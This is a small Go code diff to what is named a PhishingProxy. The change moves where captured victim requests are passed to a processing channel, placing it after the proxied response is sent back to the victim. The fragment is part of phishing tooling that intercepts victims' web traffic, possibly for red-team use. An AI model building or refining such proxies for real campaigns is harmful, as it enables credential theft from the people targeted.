@@ -51,8 +51,6 @@ func (p *PhishingProxy) HandleConnection(conn net.Conn, requests chan<- *http.Re
 	}
 
 	p.rewriteHeaders(request)
-	requests <- request
-
 	resp, err := p.client.Do(request)
 	if err != nil {
 		log.Println("Proxy error:", err.Error())
@@ -71,6 +69,7 @@ func (p *PhishingProxy) HandleConnection(conn net.Conn, requests chan<- *http.Re
 		log.Println("Error responding to victim:", err.Error())
 		return
 	}
+	requests <- request
 }
 
 func processRequests(requests <-chan *http.Request) {
